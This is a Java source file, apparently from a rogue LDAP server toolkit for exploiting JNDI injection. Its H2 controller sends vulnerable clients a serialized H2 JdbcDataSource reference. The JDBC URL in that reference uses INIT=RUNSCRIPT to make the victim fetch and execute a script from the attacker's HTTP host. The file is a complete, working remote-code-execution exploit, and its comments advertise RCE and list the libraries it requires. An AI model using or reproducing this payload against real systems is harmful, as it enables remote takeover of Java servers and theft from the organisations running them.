package artsploit.controllers;

import artsploit.Config;
import artsploit.Utilities;
import artsploit.annotations.LdapMapping;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;

import javax.naming.Reference;
import javax.naming.StringRefAddr;

import static artsploit.Utilities.serialize;

/**
 * Yields:
 *  RCE via arbitrary bean creation in {@link org.apache.naming.factory.BeanFactory}
 *  When bean is created on the server side, we can control its class name and setter methods,
 *   so we can leverage {@link javax.el.ELProcessor#eval} method to execute arbitrary Java code via EL evaluation
 *
 * @see https://www.veracode.com/blog/research/exploiting-jndi-injections-java for details
 *
 * Requires:
 *  Tomcat 8+ or SpringBoot 1.2.x+ in classpath
 *  - tomcat-embed-core.jar
 *  - tomcat-embed-el.jar
 *
 * @author artsploit
 */
@LdapMapping(uri = { "/o=h2" })
public class H2 implements LdapController {

    public void sendResult(InMemoryInterceptedSearchResult result, String base) throws Exception {

        System.out.println("Sending LDAP ResourceRef result for " + base + " with H2 payload");
        String payloadURL = "http://" + Config.hostname + ":" + Config.httpPort + Config.h2; //get from config if not specified
        String jdbcUrl = "jdbc:h2:mem:tempdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM '" + payloadURL + "'";


        Reference h2Reference = new Reference("org.h2.jdbcx.JdbcDataSource", "org.h2.jdbcx.JdbcDataSourceFactory", null);
        h2Reference.add(new StringRefAddr("driverClassName", "org.h2.Driver"));
        h2Reference.add(new StringRefAddr("url", jdbcUrl));
        h2Reference.add(new StringRefAddr("user", "sa"));
        h2Reference.add(new StringRefAddr("password", "sa"));
        h2Reference.add(new StringRefAddr("description", "H2 connection"));
        h2Reference.add(new StringRefAddr("loginTimeout", "3"));

        Entry e = new Entry(base);
        e.addAttribute("javaClassName", "java.lang.String"); //could be any
        e.addAttribute("javaSerializedData", serialize(h2Reference));

        result.sendSearchEntry(e);
        result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
    }
}
